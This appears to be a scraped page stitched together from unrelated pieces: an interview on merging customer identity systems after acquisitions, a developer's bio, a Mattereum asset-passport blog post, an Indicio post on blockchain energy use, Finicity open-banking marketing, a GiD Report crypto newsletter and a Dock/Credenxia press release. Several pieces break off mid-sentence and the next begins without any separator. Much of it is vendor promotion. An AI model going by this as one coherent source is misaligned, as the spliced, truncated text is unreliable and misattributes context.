<p>During this mergers and acquisitions process, often the process is followed very, very closely, especially for publicly listed companies, and you want to try to achieve merging both IT systems as quick as you can, so that you can show that the corporate acquisition has been a success on both the technical level and on a sales level. So in terms of planning for an IT organisation, it’s important to start that planning very early in the process and getting ready and planted well, so you can do that quickly and efficiently, and move to that new common platform as quickly as you can.</p>
<p>Oscar: Yeah, I think you mentioned the fact that the system has to be consolidated, you know that that’s the biggest part of these projects of identity and access management, in cases of mergers and acquisitions. So to start seeing, what are the drawbacks and the benefits of consolidating these systems?</p>
<p>Keith: The benefits I would hope would be improved information security, probably moving away from an older legacy style identity access management system to a newer one. You bring with that new functionality, which might simplify the IT architecture. So for example, rather than having custom registration processes or custom tools for user management, you might move to out of the box solutions where those facilities are provided as a standard part of the package. In many cases, you might combine the move with a move from on-premises to cloud. Most companies are moving towards the cloud, if they have that on their corporate strategy for IT then they can make that change either at the same time or prepare to do that shortly afterwards.</p>
<p>The risks, as you say, is a very simple thing can be if, for example, consumer facing services, a lot of users are already logged in to devices, or they’re already logged in with their browser and different password managers, different browsers and applications remember the user in different ways. And if you start to upset the flow of how those passwords are remembered and presented to applications, you can very easily sort of lock your users out. For a wider consumer population, the sheer frustration of having to remember their password or go through a password reset process can be a big difference, it’s a difference between giving up and downloading the next app of your competitor, so it requires a bit of careful planning to make that flow as smooth as you can.</p>
<p>Typically in that system, you’d allow the users who are migrating off the old system to sign in ones using the old system. Ideally, you would be able to migrate any existing password hashes from the old system to the new system, or have a very smooth onboarding flow to allow them to either set a new secure password or log in using a strong authentication method, either government or banking ID used by users in that region, or some other existing strong authentication method that the user already has.</p>
<p>Oscar: That remembers me some cases of being involved in which the passwords have been hashed, has to be of course, but long time ago, and when there were less agreed standards about that, and that can be tricky if the system that is- the new system that is importing this hash passwords is not compatible with the old system. So that can create, of course, can create problems, so that’s why standards is- fulfilling the current standards, and of course, also having some backward compatibility. It’s super important into this.</p>
<p>Keith: There are really simple benefits, for example, in many older legacy systems, the username is based around either a randomly generated number or letter combination, or it’s provided by the user themselves. And for many end users, it’s a challenge to even remember what their username is.</p>
<p>In the extreme situations, we see corporate systems, for example, B2B systems where the customer needs to put in not only the customer number, but they also put in a user ID as well as a password. To migrate to a system where you maybe simplify that more like consumer facing services where you could either centralise around using your email address as your identifier, which is much, much easier to remember. Or allow the user to link their account to an existing account, such as a social media account, or LinkedIn, or other Microsoft account, for example, to allow the users to sort of move away from having a proprietary username format, and move on to having, for example, a corporate email address or their personal email address as their account identifier.</p>
<p>Oscar: Yes, and now moving to how to make this consolidation in a good way, how to have success in this CIAM consolidation, what are the – what’s a good approach? Could you tell us the main points about that?</p>
<p>Keith: Yeah, I touched earlier the importance of data quality. So to make sure that the data is clean before you start to do any type of migration, it’s really important to understand what data in each system is and how it’s validated and make sure that those formats are valid in the new system. There’s a very clear decision point of to which system you’re going to migrate, which system will be the ongoing system in the future. So typically, that would be one of the two existing systems, to the more modern of the two, to the one which is with the more capabilities and more features, longer lifecycle.</p>
<p>But it may be that you choose a third system, a new system to replace both and migrate those systems to the new. And that provider, for example, jump forward, for example, to support newer scenarios, such as not only different types of strong authentication techniques, or identity protocols, but also things like identity delegation, or electronic power of attorney, these types of services, which existing legacy systems might not support out of the box.</p>
<p>From the end user perspective, so whether they’re B2B users or consumer users, it’s really important to have very clear communications that, OK, the company has been acquired, the name is possibly changing, the brand is changing. Please be aware of this from the very beginning. And then very clear communication about when things change in the IT system. So allow the users to be aware that when they log in their login screen might change, might look different. They might have to set a new password or re-verify their email address, for example. It’s really important to have that communication in as clear user focused language as possible.</p>
<p>Oscar: Yes.</p>
<p>Keith: A lot of IT teams make the mistake of using the language that they understand and not the language that their user understands.</p>
<p>Oscar: Yeah, I have seen actually some examples like that. I don’t remember the names, but sometimes come one email saying “OK, we are having this transition to a new brand.” And it looks so simple that “OK, yeah, nice.” And other times it’s completely techie jargon, then “Oh, my God, what are you talking about?”</p>
<p>Keith: That’s right, yeah. Then you have to decide whether to move everything in one go. So have a certain date where you migrate everything in one go, do a big bang approach. Or you’re migrating applications, sort of one by one or user groups one by one. Some of that can be done, for example, as the user logs in, you can migrate users on a user-by-user basis. Or it kind of depends how much the applications are shared across the different companies; how many users use applications from both of the companies involved in the merger.</p>
<p>Oscar: So those are the main points for consolidation of identity and access management systems.</p>
<p>Keith: From a technical perspective, it’s important to try to identify if there’s a common attribute between those two systems. So if you have a trusted attribute from each of the user repositories, for example, an email address that has been verified or a phone number that has been verified, even identity number, social security number or national identity number. These can be used as common attributes to allow automated migration of users so that they can log in automatically. In cases where, for example, password hashes can be migrated, or where the user is signing in using a government or national ID platform.</p>
<p>Oscar: Yes. And in terms of compliance, normally, what are the compliance points that are relevant in this type of projects?</p>
<p>Keith: Yeah, so particularly, it’s around collecting consent where required from the user about other data is going to be, maybe data controller will be processed or will be changed during that process. So using again your IAM tools to collect that as the user signs in again, explaining that and communicating any changes to the terms and conditions. In cases where the system is in different geographical areas or different legal jurisdictions, there may be requirements, for example, for storage of user data within certain countries’ boundaries. So you may have to replicate data or have data stored within a region, you have to think carefully about those situations, especially in global or cross regional mergers and acquisitions.</p>
<p>Oscar: Yeah, yeah, certainly. And we’ve already touched in several aspects beyond the technical, the technical side, of course. We talk about standards, we talk about security, but we also talk about compliance for instance. And we talk about branding and how to communicate these things. Many people are definitely involved in all these projects that are connected to the migration of identity and access management. But this is way beyond what identity people work on that. So if you can close telling us what is your ending piece of advice, advice for companies that are today planning on mergers and acquisition?</p>
<p>Keith: I’d say definitely take advantage of the opportunities that moving to a new identity and access management system can provide for customers. So for example, if you haven’t been able to take advantage of things like linking accounts to existing user accounts, allowing users to have federation – meaning that when they’re signed into your system, they can also sign into complementary services, giving the users new tools around managing their own account, having a really good user dashboard and a way to agree or modify their permissions for the system.</p>
<p>I think beyond just the roar savings in turning off one system, or reducing the support costs for having to deal with multiple different systems, there’s real advantages in moving to one common system that has the new corporate brand, is smooth and secure for the end user, and gives them also new functionality.</p>
<p>They see that, “OK, it’s the advantage is I get to sign in. But oh, I also get this new thing. I also get a more secure account or easy way to sign in.” I think that’s something to use as an advantage in that. Also, a real big move and a real good opportunity is to think about at that stage moving to the cloud, if you’ve been hesitating about moving your identity and access management system to a cloud-based service, it can be a good time to do that during a merger and acquisition.</p>
<p>Oscar: Indeed. And as one of these last things you are talking about and – is one of the first things you talk about today is a customer, taking the opportunity to bring a better experience to the customers.</p>
<p>Keith: The way you sign in is often the front door for the service, the first place that the user ends up in when they click on a link from marketing or when they’re trying to login to their own account and you want to make that as a smooth process as possible.</p>
<p>Oscar: Yeah, exactly. Well, thanks a lot, Keith, for telling us this about mergers and acquisitions. And for the people who would like to follow, continue this conversation with you, what are the best ways to follow up or get in touch with you?</p>
<p>Keith: Yeah, the best way to get hold of me is in <a href="https://www.linkedin.com/in/keithuber/">LinkedIn</a>. Look for my name, Keith Uber, you’ll find me there and please send me a message via LinkedIn. It’s been a real pleasure to talk to you today, Oscar.

<p>I’m a military brat who grew up in Japan and then moved to Kansas City. When I’m not diving deep into technical docs or hacking on a project, I love engaging with dev communities and relaxing at home. You might find me sharing knowledge as a <a href="https://developers.google.com/community/experts">Google Developer Expert</a> in Angular, organizing <a href="https://www.ng-girls.org/">ngGirls</a> workshops as a core team member, co-organizing <a href="https://www.meetup.com/angularkc/">AngularKC meetups</a>, or creating a curriculum for women to learn web development skills at <a href="https://codingandcocktails.kcwomenintech.org/">Coding &amp; Cocktails</a>. You might also find me leaning into my homebody ways by reading, enjoying a glass of wine, playing word puzzle games, or watching K-Dramas. Oh, and yes, I do love watching <a href="https://www.ghibli.jp/">Studio Ghibli</a> films.</p>

<p>My professional technical background is over ten years of enterprise software development working on B2B products in various languages, from C++, C#, Java, and JavaScript. From image rendering to creating web services and APIs to implementing event orchestration to developing mobile-friendly web apps, I’ve had an opportunity to learn a lot. But I took a shine to all things JavaScript. Of course, I love <a href="https://angular.io">Angular</a> and am also excited about both front-end and back-end JavaScript frameworks. It’s incredible what we can create with code, and I am always in awe of all the innovations in software development! We, as devs, are pretty magical! ✨</p>

<p>Marketplace deception is everywhere, at great cost and risk to consumers and businesses. Regulation alone won’t fix it. Can Mattereum Asset Passports and Product Information Markets help secure trust in B2B and B2C&nbsp;trade?</p><p>On October 13, 2021, the Federal Trade Commission issued a<a href="https://www.ftc.gov/system/files/attachments/penalty-offenses-concerning-endorsements/npo_endorsement_template_letter.pdf"> Notice of Penalty Offenses</a> to over 700 companies, putting pressure on American businesses to disengage from deceptive practices such as fake reviews and false endorsements or else face civil penalties.</p><p><a href="https://www.ftc.gov/news-events/press-releases/2021/10/ftc-puts-hundreds-businesses-notice-about-fake-reviews-other">FTC Puts Hundreds of Businesses on Notice about Fake Reviews and Other Misleading Endorsements</a></p><p>The<a href="https://www.ftc.gov/system/files/attachments/penalty-offenses-concerning-endorsements/list-recipients-endorsement-notice.pdf"> list of companies</a> on the notice include some of the largest companies in the world across a range of industries, such as Alphabet, Inc. (Google), Amazon, Apple, Microsoft, Shell Oil, Starbucks, McDonalds, and many others. A quick skim through the list gives the impression that almost any household name company actively deceives consumers as part of their ongoing business strategy, at least according to the&nbsp;FTC.</p><p>This form of marketplace deception is not limited to B2C relationships. On October 14, 2021, Reuters<a href="https://www.reuters.com/business/aerospace-defense/boeing-deals-with-new-defect-787-dreamliner-wsj-2021-10-14/"> reported</a> that aerospace giant Boeing had notified the Federal Aviation Administration (FAA) that it had discovered defective parts for its 787 Dreamliner fleet which were sourced by a supplier and manufactured by another&nbsp;company.</p><p><a href="https://www.reuters.com/business/aerospace-defense/boeing-deals-with-new-defect-787-dreamliner-wsj-2021-10-14/">Boeing finds new defect in continuing struggle to produce Dreamliner 787</a></p><p>These forms of marketplace deception are seemingly omnipresent in trade at all scales. While regulation may be able to get many businesses to more authentically engage with consumers and other businesses, some of these entities are of such a size that they can simply absorb civil penalties en masse and proceed with business as&nbsp;usual.</p><p>To combat this endemic deception of consumers, we need a combined effort of effective regulation and technological solutions to secure trust in digital commerce. More specifically, we need to establish standards for consumer protection, and implement the protocols capable of meeting&nbsp;them.</p><p>The Mattereum Protocol is well-suited for tackling the challenge of holding companies to account for their stated claims, specifically by offering buyers warrantied claims around their purchased goods powered by an incentivized network of third-party expert certifiers. Let’s explore how Mattereum as a trust-as-a-service platform can help create more authentic relationships between businesses and consumers and between businesses themselves.</p> How do we build Trust-as-a-Service? <p>Ultimately, Mattereum is building a system to secure truth in trade at all scales: documenting and offsetting negative externalities, creating a circular economy of reuse, recycling, and upcycling of goods, and designing incentives which align profitability with sustainability. Let’s unpack the Mattereum approach and explore how it would work in B2C and B2B contexts.</p> Asset Passports: Living Product Documentation <p>The Mattereum Asset Passport (MAP) is the core mechanism of the Mattereum Protocol.</p><p>In short, a MAP is a bundle of legal warranties tied to an object. While these warranties can vary with the object in question, the initial warranty is often some form of identification. Other warranties in a MAP may include authentication methods, carbon offsets, anti-slavery certification, tokenization (or connections to any smart contract or software system), and many others. These warranties are essentially “<a href="https://medium.com/humanizing-the-singularity/composable-commerce-with-mattereum-asset-passports-4e102f85139a">legal lego</a>” of various contract terms that will range greatly between different asset classes and will accrue around assets over&nbsp;time.</p><p>All claims are cryptographically signed, secured, and backed by financial stake, giving all warrantors accountability and skin-in-the-game for their assessments. This framework also provides access to dispute resolution protocols in the event of systemic or commercial fallout via an arbitration clause in the contract.</p><p>Asset Passports are not a static structure but a dynamic, living documentation that evolves throughout the product lifecycle. Once this initial documentation is established, we need a suitable incentive mechanism in place to supply and secure warrantied product information without relying wholly on centralized institutions.</p> Product Information Markets: Breaking Out of the Silos of Separate&nbsp;“Truths” <p>In both B2C and B2B contexts, trust is heavily centralized. We source our product knowledge from companies either directly or through ratings programs they design and companies source their materials and product information with trade partners or distant multiple-degree connections in their supply&nbsp;chains.</p><p>Instead of relying on companies to secure trust and accountability when they are incentivized to stack the deck in their favor and shield themselves from liabilities, we propose a more decentralized, networked solution that can bring in third-party expertise to supply and secure warranties in a structure we call production information markets&nbsp;(PIMs).</p><p>In short, a PIM is method of incentivizing truth in markets by allowing industry experts to make money from their niche knowledge and face consequences for erroneous claims. For the crypto-savvy, the PIM model makes use of a cryptoeconomic system — or protocol-based<a href="https://en.wikipedia.org/wiki/Mechanism_design"> mechanism design</a> — to incentivize a particular set of behaviors within the network, in this case the supplying and securing of production information over&nbsp;time.</p><p>Together, the living product documentation and bundle of warranties of the MAPs and the incentive structure enabled by PIMs can help create more authentic B2C and B2B relationships which don’t rely on deceptive business practices at the expense and detriment to&nbsp;many.</p> Mattereum Trust-as-a-Service: B2C <p>The Mattereum model is a win-win for businesses and their customers. Any of the 700+ companies listed in the FTC Notice of Penalty Offenses — ranging from tech giants to telecomms to food services — would benefit from embracing a more decentralized approach to securing information and accountability around the sale of goods and services. Fake reviews and shady endorsements simply don’t work well within the Mattereum Protocol. By design, any and all faulty information has consequences.</p><p>Companies can take initiative by integrating the Mattereum Protocol into their launch process or wait for their customers to do so down the line. The former option is certainly ideal.</p><p>An Asset Passport can be generated at any point throughout a product’s lifecycle. Of course, having a MAP at the beginning of the cycle at the point of manufacturing or even design stage would allow for much more information-rich documentation over the course of time, but MAPs can be created even years after initial product&nbsp;release.</p><p>Instead of putting the burden on companies to create and implement their own trust frameworks, they can instead plug their operations into an existing protocol. This makes adoption easier than a patchwork, disconnected solution.</p><p>There is a potentially huge long-term effect in this approach. If a credibly-neutral, autonomous, decentralized third-party system for warrantying product information takes off, it will put pressure on businesses to improve the quality and authenticity of their offering. Failure to adapt to the new paradigm will result in a flight of customers to more provably trustworthy competitors.</p><p>This is key: product information markets turn the trustworthiness of an enterprise into a competitive advantage in the marketplace while also maintaining regulatory compliance. All in the same&nbsp;system.</p> Mattereum Trust-as-a-Service: B2B <p>As above, so&nbsp;below.</p><p>While the FTC notice highlights a severe misalignment in the average business-consumer relationship with a list of companies that looks like a library catalog, this trust problem also extends to the deals which happen much farther upstream to the corporate supply&nbsp;chain.</p><p>Between mineral and materials sourcing, manufacturing, and distribution, the sheer scale of supply chains makes it difficult to document product information before it reaches digital or physical storefronts.</p><p>The only other sources of truth available beyond the manufacturer are the specialist firms which rate and certify objects of a particular domain: fine art, collectible cards, instruments, vehicles, etc. However, these institutions are limited in their capacity by their lack of a shared record of an object’s history. Best case there’s an entry in a single database. Worst case: a single paper certificate.</p><p>This disconnected certification system and lack of initiative and coordination in securing product information creates opportunities for even the world’s largest companies — such as Boeing — to be supplied defective or counterfeit parts, components, or ingredients at real risk to public health and&nbsp;safety.</p><p>Had Boeing integrated MAPs within their supply chain and production process, they could have paired their incredibly detailed product specifications with warranties supplied by third-party engineering firms and other entities. Clear lines of accountability throughout a vast web of B2B&nbsp;deals.</p><p>While we delineate B2C and B2B for explanatory purposes, ultimately the benefits of provable authenticity cascade throughout the entire system. If a business sources materials from verifiable and transparent sources, the company will be less likely to perpetuate faulty parts or information downstream to its own customers.</p><p>The goal of Mattereum’s trust-as-a-service approach is simple in theory but profound in its potential: to power a market economy that doesn’t prey on individuals and institutions, while aligning profitability with sustainability.</p><p>The cost and optics of civil penalties will get us nowhere. Let’s try something different.</p><p>About Mattereum</p><p>London-based Mattereum was established in 2017 by a trans-disciplinary team with a track record in designing and launching nation state-level infrastructure and headed by former Ethereum release coordinator Vinay Gupta.

				  Bitcoin has given blockchain the carbon footprint of Godzilla; but when it comes to identity, blockchain-based distributed ledgers are light on energy use and long on benefits  
			  
				
				
				 <p>Blockchain has become synonymous with cryptocurrency, and crypto is rapidly becoming to energy consumption what crack cocaine once was to addiction. Headlines about <a href="https://gizmodo.com/bitcoin-miners-allegedly-steal-2-million-of-electricit-1846295318">bitcoin miners stealing electricity</a> to “<a href="https://www.bbc.com/news/technology-56012952">Bitcoin consumes ‘more electricity than Argentina</a>” have generated much heat but not always a lot of light (this article <a href="https://hbr.org/2021/05/how-much-energy-does-bitcoin-actually-consume">from</a> Harvard Business Review offers a nuanced view of the energy consumption controversy).</p>
<p>The problem is that this mental shortcut can leave the impression that the energy intensive computation required to validate bitcoin transactions — which is known as “proof of work”— is a process required by all blockchains, thereby making the technology environmentally unfriendly in general</p>
<p>It isn’t and here’s why:</p> 
			  
				
				
				  
 An identity blockchain like the Indicio Network uses signatures rather than mathematical computation to generate proof. No complex mathematical processes are needed. You either accept the signature or you don’t. 
 
<p>&nbsp;</p>
 
 A write to the ledger (and one write can be the basis for millions of identity credentials) or a look up on the ledger uses no more energy, and possibly less, than browsing a web page. 
 
<p>&nbsp;</p>
 
 A decentralized network using a blockchain-based distributed ledger means you can use <a href="https://identity.foundation/peer-did-method-spec/">Peer DIDs</a> to move most “transactions” and their cryptographic proofing off ledger. This means that for those peer-to-peer interactions, identity blockchains don’t need to do any ledger transactions at all. 
 
<p>&nbsp;</p> 
			  
				
				
				 <p>As most of our digital interactions are on a one-to-one basis, there is no need for them to take place on the blockchain; the blockchain is simply the root of trust for the identities of the parties issuing credentials: once these identities have been looked up and confirmed by each party, everything else happens peer-to-peer. And with Peer DIDs, each communication is cryptographically unique — a huge advancement in privacy and security requiring no more energy than, say, using encrypted email.</p>
<p>Although harder to quantify, the energy saved from using a technology that enables you to trust information online is&nbsp; also something to&nbsp; be taken into account. The&nbsp; same goes for more efficient and effective usability and much better risk mitigation. But the point doesn’t require this detailed analysis to hold true: All blockchains are not Bitcoin and identity blockchains using Peer DIDs are low energy consumers.</p>
<p>That’s why we run the Indicio Network and believe in and advocate for this technology: and that’s why it would be a huge loss&nbsp; if a low energy use of blockchain were to be mistakenly seen as having the carbon footprint of Godzilla.</p>

<p>In a hyperconnected world, it’s hard to name a transaction, financial or otherwise, that takes more than a few moments. Much of our business and personal lives take place on a tiny mobile screen. Instant results are the universal expectation. Buying a pair of shoes, commenting on a social post, and paying utility bills are all part of consumers’ continuous, uninterrupted flow. If it happens on a screen, it has to be now, now, now. Secure account opening is no different. Make your customer wait, and they’re gone.&nbsp;</p>
<p>While account opening should take only seconds, issues like manual uploads and microdeposits add delays. Finicity, a Mastercard company, is addressing this new reality aggressively, stripping away friction points in the account set-up, onboarding and funding process. Open banking introduces new ways for financial institutions to verify account ownership and authenticate credentials. Accounts are opened and funded in moments, with a full package of data that includes account owners, details and balances. This creates the perception of immediacy that the end-user expects throughout their on-screen day.</p>
 Locking Fraudsters Out of the System 
<p>Understandably the risk, compliance, and customer experience balance is delicate. Efficiency can’t compromise fraud prevention. That’s why Finicity built its payment solution behind a driving principle: Pay Confidently. This means secure, lightning-fast account credential and balance verification. Financial service providers can verify account ownership and simplify the process by implementing their own application pre-fill functionality. Access to bank account data with instant account verification boosts sign-ups, reduces non-sufficient funds (NSF) fees and lowers abandonment rates. The connectivity is also useful when customers have an existing relationship with an FI but want to move money or add services. Data services help FIs verify account details and balances in milliseconds so they can move money accurately and securely.</p>
<p>Throughout the 2020 COVID-19 lockdowns, online fraud attacks rose by 250%. By far, the majority of them were account takeover scams, where fraudsters steal credentials and account information to siphon funds away from account holders. <a href="https://m.bankingexchange.com/news-feed/item/8593-online-banking-shift-leads-to-significant-uptick-in-fraud">These attacks rose by a staggering 650%</a>. In 2020 alone, the FTC tracked $3.3 billion in fraud losses to consumers. The convergence of fast-paced digital banking growth and a new wave of inexperienced customers created an opportunity for criminals to exploit. Finicity built its payment solution to cancel out these threats. Finicity Pay uses secure, tokenized access that yields no meaningful data if hacked. Our account verification service instantly and accurately identifies the account holder, stamping out account takeover scams before they get started. The user experience is positive, fast, and most importantly, onboarding is completed at the exact moment that the consumer wants to complete it.&nbsp;</p>
 Why Finicity Open Banking? 
 
 95% Market coverage of direct deposit accounts. From the largest FIs to the smallest credit unions&nbsp; – Finicity has you covered. Receive fast, reliable financial data that has been permissioned by the consumer for their benefit. Finicity is leading the industry towards direct API connections, signing Data Access Agreements with the largest financial institutions, payroll providers and wealth management companies. 
 Added intelligence and deep learning. The analytics layer in our data services enables accurate, confident payments and verifications. Our added intelligence helps mitigate fraud risk, reduce payment failure and fees, enable onboarding, and maintain compliance. 
 
 A True Partner&nbsp; 
<p>The open banking wave is just beginning to rise. COVID-19 has only accelerated the shift to digital banking options that offer faster, slicker ways to set up new accounts, move money and make payments. From October 2020 to August 2021 alone, Gen Zers and Millennials doubled their<a href="https://www.forbes.com/sites/ronshevlin/2021/08/16/bank-of-america-is-losing-its-grip-on-millennials-as-fintechs-reinvent-the-checking-account/?sh=509842fe2822"> adoption</a> of digital banks as the primary holder of their accounts. Open banking is the backbone behind the innovation and lifestyle options that are driving fintech app growth.</p>
<p>This is where Finicity provides a differentiated experience. As an innovation partner, Finicity’s development team can identify the best tools to suit your unique use case with the transparency and control that consumers demand. If they feel they can easily set up a new account and then pay quickly and safely, they will adopt your platform. The confidence that secure account opening inspires will drive down-funnel conversions and build confidence in your organization.&nbsp;</p>

 GiD Report#182 — Bitcoin goes mainstream <p>Welcome to The GiD Report, a weekly newsletter that covers GlobaliD team and partner news, market perspectives, and industry analysis. You can <a href="https://medium.com/global-id/gid-report-181-the-future-will-be-self-sovereign-d0218fff9989">check out last week’s report&nbsp;here</a>.</p><p>This week:</p>  The Bitcoin ETF has finally&nbsp;arrived  Flare launches its Songbird test&nbsp;network  A primer on&nbsp;DeFi  Meme of the&nbsp;week  Stuff happens   1. The Bitcoin ETF has finally&nbsp;arrived. The first Bitcoin ETF is now trading on the NYSE, Photo: Jayson Photography<p>2021 will be remembered as the year that Bitcoin went mainstream. First came the Coinbase IPO, a watershed moment for the industry as the largest U.S. exchange touched a market cap of over $95 billion on its first day listed on the&nbsp;NASDAQ.</p><p>Soon after, El Salvador’s 40-year-old president Nayib Bukele announced that Bitcoin would be considered a national currency. (That <a href="https://www.nytimes.com/2021/10/07/world/americas/bitcoin-el-salvador-bukele.html">experiment is ongoing</a>.) There are rumblings that <a href="https://www.yahoo.com/now/bitcoin-set-become-legal-payment-154644863.html">Brazil might follow suit</a>. (Brazilians have bought more than $4 billion worth of cryptocurrency this year, <a href="https://news.bitcoin.com/brazil-have-bought-over-4-billion-in-cryptocurrency-this-year/">according to their central&nbsp;bank</a>.)</p><p>And this week, Proshares has <a href="https://www.cnbc.com/2021/10/18/first-bitcoin-futures-etf-to-make-its-debut-on-the-nyse-tuesday-proshares-says.html">launched the first Bitcoin ETF in the U.S. on the NYSE</a>. (Exchange traded crypto products have already launched in Canada and across&nbsp;Europe.)</p><p>Countless Bitcoin ETFs have been proposed over the years. Until now, the SEC has rejected the idea, but SEC chief Gary Gensler recently softened his tone, noting that an ETF based on Bitcoin futures was more palatable to the enforcement agency. Since mutual fund rules would apply, Gensler <a href="https://www.bloomberg.com/news/articles/2021-10-15/bitcoin-futures-etf-said-not-to-face-sec-opposition-at-deadline">believes such a setup would provide “significant investor protections</a>.”</p><p>A Bitcoin ETF is a big deal because it provides institutional investors access to crypto exposure through a highly regulated investment vehicle.</p><p>Here’s <a href="https://www.nytimes.com/2021/10/18/business/dealbook/bitcoin-etf-proshares.html">Dealbook</a>:</p><blockquote>“2021 will be remembered for this milestone,” said Michael Sapir, the C.E.O. of ProShares. Investors who are curious about crypto but hesitant to engage with unregulated crypto exchanges want “convenient access to Bitcoin in a wrapper that has market integrity,” he said. For nearly a decade, crypto entrepreneurs and traditional finance firms have sought permission to launch a Bitcoin E.T.F. in the U.S., but their applications have been <a href="https://www.nytimes.com/2021/04/29/business/bitcoin-etf.html">delayed</a> or denied by the S.E.C. Many remain&nbsp;pending.</blockquote><p>It’s also just the beginning:</p><blockquote>“This is an exciting step but not the last,” Douglas Yones, the N.Y.S.E.’s head of exchange traded products, told DealBook. He foresees a range of crypto-linked E.T.F.s getting approval, eventually. Tomorrow’s E.T.F. launch is another sign of crypto’s mainstream legitimacy in a year of milestones for the industry, including the crypto exchange Coinbase going public. Critics <a href="https://nymag.com/intelligencer/2021/10/why-the-big-short-guys-think-bitcoin-is-a-bubble.html">remain wary</a> of cryptocurrencies, <a href="https://www.nytimes.com/live/2021/10/15/business/news-business-stock-market#crypto-industry-players-mobilize-in-washington-to-shape-new-rules">as do regulators</a>, but the digital asset craze of 2021 shows few signs of&nbsp;abating.</blockquote><p>Elsewhere in&nbsp;crypto:</p>  <a href="https://www.nytimes.com/2021/10/18/business/dealbook/bitcoin-etf-proshares.html">Bitcoin Comes to the Big&nbsp;Board</a>  <a href="https://www.coindesk.com/policy/2021/10/15/cftc-fines-tether-and-bitfinex-425m-for-untrue-or-misleading-claims/">CFTC Fines Tether and Bitfinex $42.5M for ‘Untrue or Misleading’ Claims</a>  <a href="https://www.bloomberg.com/news/articles/2021-10-15/bitcoin-futures-etf-said-not-to-face-sec-opposition-at-deadline">SEC Set to Allow Bitcoin Futures ETFs as Deadline&nbsp;Looms</a>  <a href="https://www.coindesk.com/business/2021/10/12/crypto-lender-celsius-network-raises-400m-in-a-bid-to-reassure-regulators-report/">Crypto Lender Celsius Network Raises $400M in Bid to Reassure Regulators</a>  <a href="https://www.coindesk.com/business/2021/10/12/stripe-is-hiring-a-crypto-team-3-years-after-ending-its-bitcoin-support/?utm_source=Sailthru&amp;utm_medium=email&amp;utm_campaign=The%20Node%20Oct.%2012%2C%202021&amp;utm_term=The%20Node">Stripe Is Hiring a Crypto Team 3 Years After Ending Bitcoin&nbsp;Support</a>  <a href="https://www.coindesk.com/policy/2021/10/13/global-finance-watchdog-says-133b-stablecoin-sector-remains-niche/">Global Finance Watchdog Says $133B Stablecoin Sector Remains&nbsp;Niche</a>  <a href="https://blockworks.co/consensys-acquires-treums-team-nft-platform/?oly_enc_id=3914C9559689A4M">ConsenSys Acquires Treum’s Team, NFT Platform — Blockworks</a>  <a href="https://blockworks.co/coinbase-plans-to-launch-nft-marketplace/?oly_enc_id=3914C9559689A4M">Coinbase Plans to Launch NFT Marketplace — Blockworks</a>  <a href="https://www.ft.com/content/167a35ad-0fca-430d-a72d-b5967c557c04">SEC throws sop to US investors with bitcoin ‘lite’ equity&nbsp;ETFs</a>   2. Flare launches its Songbird test&nbsp;network <p>The Flare Network was<a href="https://flare.xyz/introducing-flare/"> announced</a> to much hooplah last November — promising to bring the power of Ethereum smart contracts to XRP but without the scalability limitations of Ethereum’s proof-of-work or even proof-of-stake mechanisms.</p><p>Why is that a big deal? Smart contracts — programs stored on the blockchain — are the basic building blocks for the DeFi revolution we’ve witnessed over the last year. (They’re also important to NFTs and dApps or decentralized applications.)</p><p>In addition to XRP, the Flare Network should eventually be able to bring smart contract features to any blockchain. (The current launch plans also include Litecoin and Dogecoin.)</p><p>The project recently hit a new milestone with <a href="https://flare.xyz/putting-songbird-in-flight/">the launch of Songbird</a>. Songbird is a Canary Network, essentially a fancy term for a test network, powered by its own scarce token (SGB), allowing developers and users to get acquainted with the Flare Network prior to&nbsp;launch.</p><p>I spoke to the Flare team this morning, and they expect Songbird to be feature complete by the end of the year with the Flare Network itself launching sometime in Q1&nbsp;2022.</p><p>In the meantime, you can <a href="https://flare.xyz/">learn more about Flare here</a> and <a href="https://bifrostwallet.com/">grab the Bifrost wallet</a>, which supports the SGB&nbsp;token.</p> 3. A primer on&nbsp;DeFi <p>Speaking of DeFi, here’s a great primer for those looking for a quick 101 crash course on the topic, courtesy of the Wharton School (via <a href="http://global.id/">/gregkidd</a> and <a href="http://global.id/">/junhiraga</a>):</p>  <a href="https://wifpr.wharton.upenn.edu/wp-content/uploads/2021/05/DeFi-Beyond-the-Hype.pdf">DeFi Beyond the&nbsp;Hype</a>:  <blockquote>DeFi is a general term for decentralized applications (Dapps) providing financial services on a blockchain settlement layer, including payments, lending, trading, investments, insurance, and asset management.

<p>Preparing to move towards a decentralized solution for creating and managing employee credentials, Credenxia is working with Dock to build a Proof of Concept (PoC) application to create, issue, manage, and verify credentials instantly. This PoC is now complete!</p><p>Helping businesses around the world work smarter, better, and faster, <a href="https://www.credenxia.com/">Credenxia</a> offer a digital platform that uses cloud and smart technology to verify employee identity and establish proof of qualifications. With a mission to simplify management of the workforce, Credenxia understood the need to provide alternatives to their existing centralized verification solutions.</p><p>The better solution? Verifiable credentials. These are digital versions of an individual's identity documents, academic achievement, licenses and more. Verifiable credentials use cryptography, providing assurance as to who issued the credential and who it belongs to, as well as guaranteeing the legitimacy of it. Verifiable credentials sit in a digital wallet on the individual’s mobile device, giving users back control over their identity.</p><p>What are Verifiable Credentials and what makes it a better option?</p><p>These digital certificates are stored on an individual's digital wallet that can reside on a mobile device. If the accreditation requires a time stamp on how long it is valid for, the verifiable credential can be time stamped, anchoring them to the Dock blockchain. These credentials can be digitally presented to a third party for instant verification. Users receive the certifications and identity from the issuing body, i.e. qualifications from educational organizations, they own it and use it entirely on their own free will.</p><p>It saves a workforce several days on the time it takes to issue and verify an individual's identity and credentials. A university can take months to prepare, issue and print certificates and diplomas, and an employer would spend weeks verifying an employee’s identity and accreditations. With verifiable credentials, hundreds of certifications and identities can be legitimately issued and verified instantly, saving hours and days of tedious work.</p><p>In addition, verifiable credentials are tamper-proof and use cryptography to ensure that only the issuer can make changes to the credentials, and only the intended recipient can present the credentials in a verifiable way.</p><p>Dock’s work with Credenxia</p><p>To date, Credenxia has provided a centralized solution with verification through their cloud-based portal. Wanting to offer an alternative to their existing centralized solutions that provides the added benefits of using verifiable credentials with blockchain technology, Credenxia approached Dock to help them develop a Proof of Concept (PoC) application. The vision was to give back control over one’s credentials and identity and allow instant verification of credentials.</p><p>Using Dock’s API, Credenxia will also offer decentralized solutions, building an application where credentials are held by an individual and where all data held is correct and legitimate, using an identity verification service to verify details of individuals prior to registration.</p><p>Dock CEO Nick Lambert said of the collaboration “Credenxia’s use of verifiable credentials is a great use case and we’re excited to support them in bringing this product to the market. Credenxia are getting in on the ground floor with this technology which will significantly reduce verification times and costs for their customers”.</p><p>Credenxia CEO Terry Jones said of the collaboration, “We are very pleased to have completed the Proof of Concept with 